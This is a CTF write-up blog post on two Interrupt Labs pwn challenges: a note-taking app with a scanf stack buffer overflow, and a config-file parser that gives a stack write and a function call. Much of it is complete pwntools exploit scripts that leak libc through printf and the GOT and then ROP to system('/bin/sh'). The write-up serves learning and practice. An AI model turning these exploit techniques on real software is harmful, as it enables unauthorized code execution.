---
title: "interruptlabsCTF"
date: 2025-08-21T21:23:52+02:00
tags: ["pwn"]
categories: ["ctf"]
author: "Ayman Boulaich"
showToc: false
TocOpen: false
draft: false
hidemeta: false
comments: false
summary: "I was randomly scrolling through some research forums when I ended up on Interrupt Labs’ blog. They had this cool post about integrating IDA with Obsidian, which caught my attention. Such a random thing made me read about them and his philosophy as a VR company and quickly loved his way of doing the things."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: true
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

I was randomly scrolling through some research forums when I ended up on Interrupt Labs’ [blog](https://www.interruptlabs.co.uk/articles/heimdallr-a-way-to-integrate-ida-pro-into-obsidian-notes). They had this cool post about **integrating IDA with Obsidian**, which caught my attention. Such a random thing made me read about them and his philosophy as a VR company and quickly loved his way of doing the things.

![Untitled](/CTF/interruptlabsctf-1.png)

So here I am today writing up two of the VR challenge they found interesting and, eventually, getting the chance to be interviewed by them.

![Untitled](/CTF/interruptlabsctf-2.png)

Honestly, the first time I saw the challenges two years ago, they were very complicated. With my **limited knowledge** at the time, I struggled to complete the last pieces of the puzzle.

Today, I can gladly say that **I completed them quite easily**, though there were some tricky parts that I found really interesting.

The **takeaways** from this is that persistence and continuous learning make even the most daunting challenges achievable, **what seems impossible today can become manageable tomorrow.**

## INDEX

- [The Note Taking App](https://pwndside.github.io/posts/interruptlabsctf/#the-note-taking-app)
- [User Input](https://pwndside.github.io/posts/interruptlabsctf/#user-input)

## The Note Taking App

![Untitled](/CTF/interruptlabsctf-3.png)

![Untitled](/CTF/interruptlabsctf-4.png)

![Untitled](/CTF/interruptlabsctf-5.png)

Once executes a contextual menu is shown with three options, let’s see what they do with **IDA**.

![Untitled](/CTF/interruptlabsctf-6.png)

![Untitled](/CTF/interruptlabsctf-7.png)

As seen earlier. the `main` function starts printing the **contextual menu** and expecting a number.

Based on which option we have chosen, there are three execution paths

If we chose to **create a note**, the binary checks whether 0x14 notes have already been created. If not, it still allows us to create a new one.

![Untitled](/CTF/interruptlabsctf-8.png)

Then `write_note` is called with the **top of the stack** as argument.

![Untitled](/CTF/interruptlabsctf-9.png)

![Untitled](/CTF/interruptlabsctf-10.png)

`scanf` without proper checks and writes directly to the stack **what could go wrong?**

Here we have a basic example of a **buffer overflow** which, due to the absence of a **stack canary** and **ASLR**, should be relatively **easy to exploit**.

![Untitled](/CTF/interruptlabsctf-11.png)

The **limitation** here is that we must take into account that `0xc0` bytes from the input will be copied onto the **top of the previous** `rsp`.

![Untitled](/CTF/interruptlabsctf-12.png)

My plan is to craft a **ROP chain** that calls `printf` from the **PLT**, passing a populated **GOT** entry as the first argument to leak a **libc address**.

To overcome the limitation mentioned earlier, we should put everything which is placed at the top of previous `rsp` at the start of the payload.

```python
io = start()

io.sendline("1")

rop = ROP(exe)
pop_rdi_ret = rop.find_gadget(["pop rdi" , "ret"]).address
ret = rop.find_gadget(["ret"]).address

payload = p64(exe.got.printf) + p64(ret) + p64(exe.sym.printf) + p64(ret) + p64(0x401196)

payload = payload + b"A"* (0xd8 - len(payload)) + p64(pop_rdi_ret)
io.sendlineafter(b"Enter Note Below", payload)

io.recvline()
leak = u64(io.recvline().strip().ljust(8,b"\x00"))
log.info("Leak: " + hex(leak))
```

Also worth to mention that in order to spawn a shell at the end of the **ROP chain** we are returning to **the vulnerable subroutine.**

In the second stage, as the **stack has been manipulated**, we do not have to pay attention to the above **limitation**.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './challenge_1')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ["tmux", "splitw", "-h"]

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
start
'''.format(**locals())

io = start()

io.sendline("1")

rop = ROP(exe)
pop_rdi_ret = rop.find_gadget(["pop rdi" , "ret"]).address
ret = rop.find_gadget(["ret"]).address

payload = p64(exe.got.printf) + p64(ret) + p64(exe.sym.printf) + p64(ret) + p64(0x401196)

payload = payload + b"A"* (0xd8 - len(payload)) + p64(pop_rdi_ret)
io.sendlineafter(b"Enter Note Below", payload)

io.recvline()
leak = u64(io.recvline().strip().ljust(8,b"\x00"))
log.info("Leak: " + hex(leak))

libc.address = leak - 0x61c90
log.info("Libc base: " + hex(libc.address))

rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh\x00"))

payload = p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(libc.sym.system)
payload = b"A"*0xd8 + payload

io.sendlineafter(b"Enter Note Below", payload)

io.interactive()
```

![Untitled](/CTF/interruptlabsctf-13.png)

![Untitled](/CTF/interruptlabsctf-14.png).jpg)

## User Input

![Untitled](/CTF/interruptlabsctf-15.png)

![Untitled](/CTF/interruptlabsctf-16.png)

Before start **reversing** the binary, let’s play a little with it.

![Untitled](/CTF/interruptlabsctf-17.png)

If executed the binary **asks for** **config file** as argument, so I crafted a config file with **random values** to see the binary **behaviour**.

![Untitled](/CTF/interruptlabsctf-18.png)

![Untitled](/CTF/interruptlabsctf-19.png)

Nothing useful from here, so **let’s dive into reversing** to get a better overview.

![Untitled](/CTF/interruptlabsctf-20.png)

The flow of the `main` function starts by checking whether **enough arguments** are provided or if the **help option is included.** If there aren’t enough arguments or the help option is specified, a **help subroutine** is called.

![Untitled](/CTF/interruptlabsctf-21.png)

If a **config file** is specified, it is opened, and the **file descriptor** along with a **freshly malloced memory buffer** are passed as arguments to `readFromFd`.

![Untitled](/CTF/interruptlabsctf-22.png)

`readFromFd` makes a bunch of read from the **fd** into **heap**, leaking us the **structure of the config file**. To **simplify** the **subroutine**, I will let a simple diagram showcasing the **structure**.

![Untitled](/CTF/interruptlabsctf-23.png)

The diagram splits config file in **sections**, the **blue addresses** indicate where each section will be written, and on the left side of each section, in **black**, the **size of that section** is displayed.

First, we **read two bytes** from `fd`, which represent the size of the next read. The next read is placed directly in the **heap**, is worth to mention that only the **last byte** of the **size is actually used**. 

![Untitled](/CTF/interruptlabsctf-24.png)

Then, **two** more **bytes** **are read**, which will be compared with the bytes `rR` stored in the **data section**.

![Untitled](/CTF/interruptlabsctf-25.png)

If the **memory blocks** **aren’t identical**, the function exits with `eax` equal to 0 (the return value is gonna be useful afterwards :P), if **the blocks don’t differ** then the function will still **reading more bytes** from `fd`.

![Untitled](/CTF/interruptlabsctf-26.png)

4 bytes are read into `[heap + 0x44]`

Finally, we encounter a **similar pattern**, two bytes are read, indicating the size of the upcoming read, the **next read** is then **stored** into `[heap + 0x32]`.

This time the `eax` value is the **signed extended addition** of `(size1 + size2 + 0xC)` 

As mentioned before is very handy to have the diagram for **clarifying the process.**

![Untitled](/CTF/interruptlabsctf-27.png)

Depending on the previously mentioned exit value, there are two possible execution paths. As we don’t have any clue of what this value is used for, let’s start with anyone

From this point, the `main` function starts to look **quite overwhelming**, with many different types of operations. In those cases, I like to search for **vulnerable stuff** first and try to understand in **later stages** (This has prevented me from falling into a lot of **rabbit holes**).

![Untitled](/CTF/interruptlabsctf-28.png)

This **block caught my attention** because, it copies `exitVal` bytes from heap to `rsp` and calls the function saved at `[heap+0x48]` .

Since this is the path where the exit value equals `(size1 + size2 + 0xC)` and there is no modification of the heap on the process,  **we gain a write primitive** to `rsp` and **the ability to call a function of our choice**. These are all the ingredients needed to achieve **code execution.**

So let’s outline a plan, the main idea is taking advantage of **stack write primitive** by writing the **ROP chain** in the heap as later will be copied into `rsp` and place a **pointer to a function** on the position `[heap+0x48]`  so execution returns directly to `rsp`.

This is how should look our **config file.**

![Untitled](/CTF/interruptlabsctf-29.png)

In order to craft a proper **ROP chain** to call `system` and **spawn a shell**, a **libc leak** will be needed, we can achieve that invoking `printf` from the **PLT** and passing a **populated GOT entry** as the first argument (in our case, I used `read`).

```python
rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address

payload = p64(pop_rdi) + p64(exe.got.read) + p64(exe.sym.printf) + p64(0x401764)
pad = payload + b'A'*(0x32 - len(payload))
heap = b'A'*0x16 + p64(pop_rdi)
data = p16(0x32) + pad + b'rR' + b'A'*0x4 + p16(0x1e) + heap

config_path = "config_file_path"
f = open(config_path, "wb")

f.write(data)
f.flush()
```

The binary gadget `pop_rdi` is placed into `[heap+0x48]` so execution returns directly to `rsp`. Is worth to mention that the end of our **ROP chain** loops back to `copyFromFd` in `main`, allowing us to repeat the attack.

![Untitled](/CTF/interruptlabsctf-30.png)

Nicee we got a **libc leak**, let’s place the actual **ROP chain** to **spawn a shell,** appending the new **config file** to the existing file will do the trick.

```python
from pwn import *

exe = ELF("./challenge_2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ["tmux", "splitw", "-h"]

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
start
'''.format(**locals())

rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address

payload = p64(pop_rdi) + p64(exe.got.read) + p64(exe.sym.printf) + p64(0x401764)
pad = payload + b'A'*(0x32 - len(payload))
heap = b'A'*0x16 + p64(pop_rdi)
data = p16(0x32) + pad + b'rR' + b'A'*0x4 + p16(0x1e) + heap

config_path = "config_file_path"
f = open(config_path, "wb")

f.write(data)
f.flush()

io = start([config_path])

leak = io.recv(6).strip().ljust(8,b"\x00")

libc.address = u64(leak) - 0x10e1e0
binsh = next(libc.search(b"/bin/sh\x00"))

payload = p64(pop_rdi) + p64(binsh) + p64(libc.sym.system)
pad = payload + b'A'*(0x32 - len(payload))
heap = b'A'*0x16 + p64(pop_rdi)
data = p16(0x32) + pad + b'rR' + b'A'*0x4 + p16(0x20) + heap

f.write(data)
f.flush()

io.interactive()

```

![Untitled](/CTF/interruptlabsctf-31.png)

As expected the **binary finishes execution** before we can append the **second stage** to the config file. To keep it alive long enough, we need to prevent it from exiting. For this reason, I chose to **repeat** the first stage **10,000 times**.

```python
from pwn import *

exe = ELF("./challenge_2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ["tmux", "splitw", "-h"]

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
start
'''.format(**locals())

rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address

payload = p64(pop_rdi) + p64(exe.got.read) + p64(exe.sym.printf) + p64(0x401764)
pad = payload + b'A'*(0x32 - len(payload))
heap = b'A'*0x16 + p64(pop_rdi)
data = p16(0x32) + pad + b'rR' + b'A'*0x4 + p16(0x1e) + heap

config_path = "config_file_path"
f = open(config_path, "wb")
for i in range(10000):
    f.write(data)
f.flush()

io = start([config_path])

leak = io.recv(6).strip().ljust(8,b"\x00")

libc.address = u64(leak) - 0x10e1e0
binsh = next(libc.search(b"/bin/sh\x00"))

payload = p64(pop_rdi) + p64(binsh) + p64(libc.sym.system)
pad = payload + b'A'*(0x32 - len(payload))
heap = b'A'*0x16 + p64(pop_rdi)
data = p16(0x32) + pad + b'rR' + b'A'*0x4 + p16(0x20) + heap

f.write(data)
f.flush()

io.interactive()

```

![Untitled](/CTF/interruptlabsctf-32.png)

![Untitled](/CTF/interruptlabsctf-33.png)